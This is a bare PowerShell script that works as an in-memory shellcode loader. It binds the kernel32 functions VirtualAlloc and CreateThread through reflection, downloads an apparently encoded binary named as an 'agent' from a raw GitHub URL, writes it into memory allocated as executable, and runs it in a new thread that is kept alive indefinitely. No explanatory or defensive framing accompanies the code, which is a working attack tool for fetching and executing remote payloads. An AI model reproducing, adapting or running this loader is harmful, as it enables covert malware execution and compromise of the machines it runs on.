$url = "https://raw.githubusercontent.com/bobo22e/bobo/main/agent-windows-amd64-0e8c5426.bin.sgn"
$D = [AppDomain]::CurrentDomain
$A = $D.DefineDynamicAssembly((New-Object Reflection.AssemblyName("W32")),[Reflection.Emit.AssemblyBuilderAccess]::Run)
$M = $A.DefineDynamicModule("M")
$T = $M.DefineType("Win32Native","Public, Class")
$C = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$T.DefineMethod("VirtualAlloc","Public, Static",[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32])).SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder($C,@("kernel32.dll"))))
$T.DefineMethod("CreateThread","Public, Static",[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])).SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder($C,@("kernel32.dll"))))
$K = $T.CreateType()
$c = (New-Object Net.WebClient).DownloadData($url)
[IntPtr]$a = [Win32Native]::VirtualAlloc(0,$c.Length,0x3000,0x40)
[Runtime.InteropServices.Marshal]::Copy($c,0,$a,$c.Length)
[Win32Native]::CreateThread(0,0,$a,0,0,0) | Out-Null
while($true){Start-Sleep 3600}
